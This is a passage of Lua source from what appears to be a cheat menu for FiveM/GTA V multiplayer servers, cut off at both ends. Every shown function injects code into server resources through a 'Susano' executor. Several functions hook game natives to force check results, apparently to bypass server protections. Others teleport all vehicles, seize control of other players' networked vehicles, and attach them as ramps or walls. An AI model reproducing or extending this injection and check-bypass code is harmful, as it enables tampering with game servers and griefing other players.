
    Susano.InjectResource("any", [[
        local ped = PlayerPedId()
        if not ped or not DoesEntityExist(ped) then return end

        local function GetRandomVariation(component, exclude)
            local total = GetNumberOfPedDrawableVariations(ped, component)
            if total <= 1 then return 0 end
            local choice = exclude
            while choice == exclude do
                choice = math.random(0, total - 1)
            end
            return choice
        end

        local function GetRandomComponent(component)
            local total = GetNumberOfPedDrawableVariations(ped, component)
            return total > 1 and math.random(0, total - 1) or 0
        end

        SetPedComponentVariation(ped, 11, GetRandomVariation(11, 15), 0, 2)
        SetPedComponentVariation(ped, 6, GetRandomVariation(6, 15), 0, 2)
        SetPedComponentVariation(ped, 8, 15, 0, 2)
        SetPedComponentVariation(ped, 3, 0, 0, 2)
        SetPedComponentVariation(ped, 4, GetRandomComponent(4), 0, 2)

        local face = math.random(0, 45)
        local skin = math.random(0, 45)
        SetPedHeadBlendData(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

        local hairMax = GetNumberOfPedDrawableVariations(ped, 2)
        local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
        SetPedComponentVariation(ped, 2, hair, 0, 2)
        SetPedHairColor(ped, 0, 0)

        local brows = GetNumHeadOverlayValues(2)
        SetPedHeadOverlay(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
        SetPedHeadOverlayColor(ped, 2, 1, 0, 0)

        ClearPedProp(ped, 0)
        ClearPedProp(ped, 1)
    ]])
end

local function SetPedClothing(componentId, drawableId, textureId)
    local ped = PlayerPedId()
    if ped and DoesEntityExist(ped) then
        SetPedComponentVariation(ped, componentId, drawableId or 0, textureId or 0, 0)
    end
end

local function SetPedAccessory(propId, drawableId, textureId)
    local ped = PlayerPedId()
    if ped and DoesEntityExist(ped) then
        if drawableId == -1 or not drawableId then
            ClearPedProp(ped, propId)
        else
            SetPedPropIndex(ped, propId, drawableId, textureId or 0, true)
        end
    end
end

function Menu.ActionTPAllVehiclesToMe()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)

            local function reqCtrl(entity)
                if not DoesEntityExist(entity) then return false end
                if not NetworkGetEntityIsNetworked(entity) then return true end

                    local attempts = 0
                NetworkRequestControlOfEntity(entity)
                while not NetworkHasControlOfEntity(entity) and attempts < 20 do
                    NetworkRequestControlOfEntity(entity)
                        Wait(0)
                        attempts = attempts + 1
                    end
                    return NetworkHasControlOfEntity(entity)
            end

            CreateThread(function()
                local vehicles = GetGamePool("CVehicle")
                local currentVehicle = GetVehiclePedIsIn(playerPed, false)
                local count = 0

                for _, vehicle in ipairs(vehicles) do
                    if DoesEntityExist(vehicle) and vehicle ~= currentVehicle then
                        SetEntityAsMissionEntity(vehicle, true, true)
                        if reqCtrl(vehicle) then
                            local offsetX = (count % 4) * 3.0 - 4.5
                            local offsetY = math.floor(count / 4) * 3.0 + 3.0

                            SetEntityCoordsNoOffset(vehicle, myCoords.x + offsetX, myCoords.y + offsetY, myCoords.z, false, false, false)
                            SetVehicleOnGroundProperly(vehicle)
                            count = count + 1
                        end
                    end
                end
            end)
        ]])
    end
end

function Menu.ActionTPToWaypoint()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end

            local waypointBlip = GetFirstBlipInfoId(8)
            if waypointBlip ~= 0 then
                local waypointX, waypointY, waypointZ = table.unpack(GetBlipInfoIdCoord(waypointBlip))

                local found, groundZ = GetGroundZFor_3dCoord(waypointX, waypointY, waypointZ + 100.0, false)

                if found then
                    SetEntityCoordsNoOffset(playerPed, waypointX, waypointY, groundZ + 1.0, false, false, false)
                else
                    SetEntityCoordsNoOffset(playerPed, waypointX, waypointY, waypointZ, false, false, false)
                end
            end
        ]])
    end
end

function Menu.ActionTPToFIB()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 135.733, -749.339, 258.152, false, false, false)
        ]])
    end
end

function Menu.ActionTPToMissionRowPD()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 425.1, -979.5, 30.7, false, false, false)
        ]])
    end
end

function Menu.ActionTPToPillboxHospital()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 298.2, -584.5, 43.3, false, false, false)
        ]])
    end
end

function Menu.ActionTPToGroveStreet()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 85.0, -1960.0, 20.8, false, false, false)
        ]])
    end
end

function Menu.ActionTPToLegionSquare()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then return end
            SetEntityCoordsNoOffset(playerPed, 195.0, -933.0, 30.7, false, false, false)
        ]])
    end
end

local function SpawnVehicle(modelName)
    if not modelName then return end

    Actions.tpItem = FindItem("Vehiculo", "Spawnear", "Teletransportarse dentro")
    local shouldTeleport = Actions.tpItem and Actions.tpItem.value or false

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
         Susano.InjectResource("any", string.format([[
             local susano = rawget(_G, "Susano")

             if susano and type(susano) == "table" and type(susano.HookNative) == "function" then

                 susano.HookNative(0x2B40A976, function(entity) return true end)

                 susano.HookNative(0x5324A0E3E4CE3570, function(entity) return true end)

                 susano.HookNative(0x8DE82BC774F3B862, function() return true end)

                 susano.HookNative(0x2B1813BA58063D36, function() return true end)

                 susano.HookNative(0x35FB78DC42B7BD21, function(modelHash) return false, true end)

                 susano.HookNative(0x392C8D8E07B70EFC, function(modelHash) return false, true end)

                 susano.HookNative(0x98A4EB5D89A0C952, function(modelHash) return false, true end)

                 susano.HookNative(0x963D27A58DF860AC, function(modelHash) return false end)

                 susano.HookNative(0xEA386986E786A54F, function(vehicle) return false end)

                 susano.HookNative(0xAE3CBE5BF394C9C9, function(entity)
                     local entityType = GetEntityType(entity)
                     if entityType == 2 then
                         return false
                     end
                     return true
                 end)

                 susano.HookNative(0x7D9EFB7AD6B19754, function(vehicle, toggle) return false end)

                 susano.HookNative(0x1CF38D529D7441D9, function(vehicle, toggle) return false end)

                 susano.HookNative(0x99AD4CCCB128CBC9, function(vehicle) return false end)

                 susano.HookNative(0xE5810AC70602F2F5, function(vehicle, speed) return false end)
             end

             Citizen.CreateThread(function()
                 Wait(1000)

                 local ped = PlayerPedId()
                 local coords = GetEntityCoords(ped)
                 local heading = GetEntityHeading(ped)
                 local offsetX = coords.x + math.sin(math.rad(heading)) * 3.0
                 local offsetY = coords.y + math.cos(math.rad(heading)) * 3.0
                 local offsetZ = coords.z

                 local modelHash = GetHashKey("%s")
                 if modelHash == 0 then
                     return
                 end

                 RequestModel(modelHash)
                 local timeout = 0
                 while not HasModelLoaded(modelHash) and timeout < 200 do
                     Citizen.Wait(10)
                     timeout = timeout + 1
                 end

                 if HasModelLoaded(modelHash) then
                     Citizen.Wait(200)

                     local groundZ = offsetZ
                     local found, ground = GetGroundZFor_3dCoord(offsetX, offsetY, offsetZ + 10.0, groundZ, false)
                     if found then
                         offsetZ = groundZ + 0.5
                     end

                     local vehicle = CreateVehicle(modelHash, offsetX, offsetY, offsetZ, heading, true, false)
                     if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                         local netId = NetworkGetNetworkIdFromEntity(vehicle)
                         if netId and netId ~= 0 then
                             SetNetworkIdCanMigrate(netId, false)
                             SetNetworkIdExistsOnAllMachines(netId, true)
                         end
                         SetEntityAsMissionEntity(vehicle, true, true)
                         SetVehicleHasBeenOwnedByPlayer(vehicle, true)
                         SetVehicleNeedsToBeHotwired(vehicle, false)
                         SetVehicleEngineOn(vehicle, true, true, false)
                         SetVehicleOnGroundProperly(vehicle)

                         if %s then
                             Citizen.Wait(300)
                             TaskWarpPedIntoVehicle(ped, vehicle, -1)
                         end

                         SetModelAsNoLongerNeeded(modelHash)
                     end
                 end
             end)
         ]], modelName, tostring(shouldTeleport)))
     end
end

local function MaxUpgrade()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local susano = rawget(_G, "Susano")

            if susano and type(susano) == "table" and type(susano.HookNative) == "function" and not _max_upgrade_hooks_applied then
                _max_upgrade_hooks_applied = true

                susano.HookNative(0x8DE82BC774F3B862, function(entity)
                    return true
                end)

                susano.HookNative(0x4CEBC1ED31E8925E, function(entity)
                    return true
                end)

                susano.HookNative(0xAE3CBE5BF394C9C9, function(entity)
                    return true
                end)

                susano.HookNative(0x2B40A976, function(entity)
                    return true
                end)

                susano.HookNative(0xAD738C3085FE7E11, function(entity, p1, p2)
                    return true
                end)
            end

            CreateThread(function()
                Wait(100)

                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)

                if not vehicle or vehicle == 0 then
                    return
                end

                if not NetworkHasControlOfEntity(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(vehicle) and timeout < 200 do
                        Wait(10)
                        timeout = timeout + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end

                SetEntityAsMissionEntity(vehicle, true, true)

                SetVehicleModKit(vehicle, 0)

                SetVehicleWheelType(vehicle, 7)

                for modType = 0, 16 do
                    local numMods = GetNumVehicleMods(vehicle, modType)
                    if numMods and numMods > 0 then
                        SetVehicleMod(vehicle, modType, numMods - 1, false)
                    end
                end

                SetVehicleMod(vehicle, 14, 16, false)

                local numLivery = GetNumVehicleMods(vehicle, 15)
                if numLivery and numLivery > 1 then
                    SetVehicleMod(vehicle, 15, numLivery - 2, false)
                end

                for modType = 17, 22 do
                    ToggleVehicleMod(vehicle, modType, true)
                end

                SetVehicleMod(vehicle, 23, 1, false)
                SetVehicleMod(vehicle, 24, 1, false)

                for extra = 1, 12 do
                    if DoesExtraExist(vehicle, extra) then
                        SetVehicleExtra(vehicle, extra, false)
                    end
                end

                SetVehicleWindowTint(vehicle, 1)

                SetVehicleTyresCanBurst(vehicle, false)

                Wait(100)

                SetEntityAsMissionEntity(vehicle, false, true)
            end)
        ]])
    end
end

local function RepairVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            local susano = rawget(_G, "Susano")

            if susano and type(susano) == "table" and type(susano.HookNative) == "function" and not _repair_vehicle_hooks_applied then
                _repair_vehicle_hooks_applied = true

                susano.HookNative(0x8DE82BC774F3B862, function(entity)
                    return true
                end)

                susano.HookNative(0x4CEBC1ED31E8925E, function(entity)
                    return true
                end)

                susano.HookNative(0xAE3CBE5BF394C9C9, function(entity)
                    return true
                end)

                susano.HookNative(0x2B40A976, function(entity)
                    return true
                end)

                susano.HookNative(0xAD738C3085FE7E11, function(entity, p1, p2)
                    return true
                end)

                susano.HookNative(0x115722B1B9C14C1C, function(vehicle)
                    return true
                end)
            end

            CreateThread(function()
                Wait(100)

                local ped = PlayerPedId()
                local vehicle = GetVehiclePedIsIn(ped, false)

                if not vehicle or vehicle == 0 then
                    return
                end

                if not NetworkHasControlOfEntity(vehicle) then
                    NetworkRequestControlOfEntity(vehicle)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(vehicle) and timeout < 200 do
                        Wait(10)
                        timeout = timeout + 1
                        NetworkRequestControlOfEntity(vehicle)
                    end
                end

                SetEntityAsMissionEntity(vehicle, true, true)

                SetVehicleFixed(vehicle)
                SetVehicleDeformationFixed(vehicle)
                SetVehicleUndriveable(vehicle, false)
                SetVehicleEngineOn(vehicle, true, true, false)

                SetVehicleTyresCanBurst(vehicle, true)
                for i = 0, 3 do
                    SetVehicleTyreFixed(vehicle, i)
                end

                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleDoorsLockedForAllPlayers(vehicle, false)

                SetVehicleEngineHealth(vehicle, 1000.0)
                SetVehicleBodyHealth(vehicle, 1000.0)
                SetVehiclePetrolTankHealth(vehicle, 1000.0)

                SetVehicleDirtLevel(vehicle, 0.0)
                WashDecalsFromVehicle(vehicle, 1.0)

                Wait(100)

                SetEntityAsMissionEntity(vehicle, false, true)
            end)
        ]])
    end
end

local function RampVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityForwardVector", function(originalFn, ...) return originalFn(...) end)
            hNative("AttachEntityToEntity", function(originalFn, ...) return originalFn(...) end)

            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                return
            end

            local myVehicle = GetVehiclePedIsIn(playerPed, false)
            if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
                return
            end

            CreateThread(function()
                local myCoords = GetEntityCoords(myVehicle)
                local myHeading = GetEntityHeading(myVehicle)
                local vehicles = {}
                local searchRadius = 100.0
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)
                    if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                        table.insert(vehicles, {handle = veh, distance = distance})
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success
                EndFindVehicle(vehHandle)

                if #vehicles < 3 then
                    return
                end

                table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

                local function takeControl(veh)
                    SetPedIntoVehicle(playerPed, veh, -1)
                    Wait(150)
                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                            NetworkRequestControlOfEntity(veh)
                            Wait(10)
                            timeout = timeout + 1
                        end
                    end
                end

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        takeControl(selectedVehicles[i])
                    end
                end

                SetPedIntoVehicle(playerPed, myVehicle, -1)
                Wait(100)

                local heading = GetEntityHeading(myVehicle)
                local forwardVector = GetEntityForwardVector(myVehicle)
                local vehCoords = GetEntityCoords(myVehicle)
                local rampPositions = {
                    {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                }

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        local pos = rampPositions[i]
                        AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                    end
                end
            end)
        ]])
    else
        local playerPed = PlayerPedId()
        if not IsPedInAnyVehicle(playerPed, false) then
            return
        end

        local myVehicle = GetVehiclePedIsIn(playerPed, false)
        if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
            return
        end

        CreateThread(function()
            local myCoords = GetEntityCoords(myVehicle)
            local myHeading = GetEntityHeading(myVehicle)
            local vehicles = {}
            local searchRadius = 100.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end
                success, veh = FindNextVehicle(vehHandle)
            until not success
            EndFindVehicle(vehHandle)

            if #vehicles < 3 then
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

            local function takeControl(veh)
                SetPedIntoVehicle(playerPed, veh, -1)
                Wait(150)
                SetEntityAsMissionEntity(veh, true, true)
                if NetworkGetEntityIsNetworked(veh) then
                    NetworkRequestControlOfEntity(veh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                        NetworkRequestControlOfEntity(veh)
                        Wait(10)
                        timeout = timeout + 1
                    end
                end
            end

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    takeControl(selectedVehicles[i])
                end
            end

            SetPedIntoVehicle(playerPed, myVehicle, -1)
            Wait(100)

            local heading = GetEntityHeading(myVehicle)
            local forwardVector = GetEntityForwardVector(myVehicle)
            local vehCoords = GetEntityCoords(myVehicle)
            local rampPositions = {
                {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 160.0, rotY = 0.0, rotZ = 0.0},
            }

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    local pos = rampPositions[i]
                    AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                end
            end
        end)
    end
end

local function WallVehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("AttachEntityToEntity", function(originalFn, ...) return originalFn(...) end)

            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                return
            end

            local myVehicle = GetVehiclePedIsIn(playerPed, false)
            if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
                return
            end

            CreateThread(function()
                local myCoords = GetEntityCoords(myVehicle)
                local vehicles = {}
                local searchRadius = 100.0
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)
                    if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                        table.insert(vehicles, {handle = veh, distance = distance})
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success
                EndFindVehicle(vehHandle)

                if #vehicles < 3 then
                    return
                end

                table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

                local function takeControl(veh)
                    SetPedIntoVehicle(playerPed, veh, -1)
                    Wait(150)
                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                            NetworkRequestControlOfEntity(veh)
                            Wait(10)
                            timeout = timeout + 1
                        end
                    end
                end

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        takeControl(selectedVehicles[i])
                    end
                end

                SetPedIntoVehicle(playerPed, myVehicle, -1)
                Wait(100)

                local wallPositions = {
                    {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                }

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        local pos = wallPositions[i]
                        AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                    end
                end
            end)
        ]])
    else
        local playerPed = PlayerPedId()
        if not IsPedInAnyVehicle(playerPed, false) then
            return
        end

        local myVehicle = GetVehiclePedIsIn(playerPed, false)
        if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
            return
        end

        CreateThread(function()
            local myCoords = GetEntityCoords(myVehicle)
            local vehicles = {}
            local searchRadius = 100.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end
                success, veh = FindNextVehicle(vehHandle)
            until not success
            EndFindVehicle(vehHandle)

            if #vehicles < 3 then
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

            local function takeControl(veh)
                SetPedIntoVehicle(playerPed, veh, -1)
                Wait(150)
                SetEntityAsMissionEntity(veh, true, true)
                if NetworkGetEntityIsNetworked(veh) then
                    NetworkRequestControlOfEntity(veh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                        NetworkRequestControlOfEntity(veh)
                        Wait(10)
                        timeout = timeout + 1
                    end
                end
            end

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    takeControl(selectedVehicles[i])
                end
            end

            SetPedIntoVehicle(playerPed, myVehicle, -1)
            Wait(100)

            local wallPositions = {
                {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
                {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.2, rotX = 0.0, rotY = 0.0, rotZ = 0.0},
            }

            for i = 1, 3 do
                if DoesEntityExist(selectedVehicles[i]) then
                    local pos = wallPositions[i]
                    AttachEntityToEntity(selectedVehicles[i], myVehicle, 0, pos.offsetX, pos.offsetY, pos.offsetZ, pos.rotX, pos.rotY, pos.rotZ, false, false, true, false, 2, true)
                end
            end
        end)
    end
end

local function Wall2Vehicle()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("AttachEntityToEntity", function(originalFn, ...) return originalFn(...) end)

            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                return
            end

            local myVehicle = GetVehiclePedIsIn(playerPed, false)
            if not DoesEntityExist(myVehicle) or GetPedInVehicleSeat(myVehicle, -1) ~= playerPed then
                return
            end

            CreateThread(function()
                local myCoords = GetEntityCoords(myVehicle)
                local vehicles = {}
                local searchRadius = 100.0
                local vehHandle, veh = FindFirstVehicle()
                local success

                repeat
                    local vehCoords = GetEntityCoords(veh)
                    local distance = #(myCoords - vehCoords)
                    local vehClass = GetVehicleClass(veh)
                    if distance <= searchRadius and veh ~= myVehicle and vehClass ~= 8 and vehClass ~= 13 then
                        table.insert(vehicles, {handle = veh, distance = distance})
                    end
                    success, veh = FindNextVehicle(vehHandle)
                until not success
                EndFindVehicle(vehHandle)

                if #vehicles < 3 then
                    return
                end

                table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle}

                local function takeControl(veh)
                    SetPedIntoVehicle(playerPed, veh, -1)
                    Wait(150)
                    SetEntityAsMissionEntity(veh, true, true)
                    if NetworkGetEntityIsNetworked(veh) then
                        NetworkRequestControlOfEntity(veh)
                        local timeout = 0
                        while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                            NetworkRequestControlOfEntity(veh)
                            Wait(10)
                            timeout = timeout + 1
                        end
                    end
                end

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        takeControl(selectedVehicles[i])
                    end
                end

                SetPedIntoVehicle(playerPed, myVehicle, -1)
                Wait(100)

                local wall2Positions = {
                    {offsetX = -2.0, offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 0.0,  offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                    {offsetX = 2.0,  offsetY = 2.5, offsetZ = 0.6, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                }

                for i = 1, 3 do
                    if DoesEntityExist(selectedVehicles[i]) then
                        local pos = wall2Positions[i]
